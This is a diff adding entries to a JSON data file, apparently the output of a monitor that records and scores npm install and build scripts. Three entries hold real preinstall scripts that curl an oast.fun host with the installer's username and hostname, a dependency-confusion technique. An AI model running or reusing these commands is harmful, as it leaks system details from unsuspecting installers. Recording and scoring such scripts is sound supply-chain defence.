@@ -1,5 +1,75 @@
 [
   {
+    "packageName": "@mesh-helpers/common",
+    "version": "99999.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"https://mesh-helpers-common.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun/$(whoami)/$(hostname)/depconfusion\" || nslookup mesh-helpers-common.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun || true",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:39.079Z",
+    "issuesend": false,
+    "suspicionScore": 12
+  },
+  {
+    "packageName": "@box0/cli",
+    "version": "0.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node install.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:38.400Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@gonzih/skills-legal",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node install.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:34.870Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@mesh-atoms/typography",
+    "version": "99999.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"https://mesh-atoms-typography.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun/$(whoami)/$(hostname)/depconfusion\" || nslookup mesh-atoms-typography.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun || true",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:33.186Z",
+    "issuesend": false,
+    "suspicionScore": 12
+  },
+  {
+    "packageName": "@mesh-config/theme",
+    "version": "99999.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"https://mesh-config-theme.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun/$(whoami)/$(hostname)/depconfusion\" || nslookup mesh-config-theme.iwijzwrasfjvknabawksfxwikb8urcg5w.oast.fun || true",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:31.287Z",
+    "issuesend": false,
+    "suspicionScore": 12
+  },
+  {
+    "packageName": "rspress-plugin-blog",
+    "version": "0.0.1",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:01:07.807Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "iobroker.nibe-rest-api",
+    "version": "0.0.3",
+    "scriptType": "prebuild",
+    "scriptContent": "rimraf build",
+    "previousVersion": null,
+    "timestamp": "2026-03-22T07:00:28.939Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
     "packageName": "@heartlandone/vega-sandbox-pr-2704-9e519f6764c5fbb60b3ca0477604f576f2e5d8cc",
     "version": "2.77.1",
     "scriptType": "postbuild",
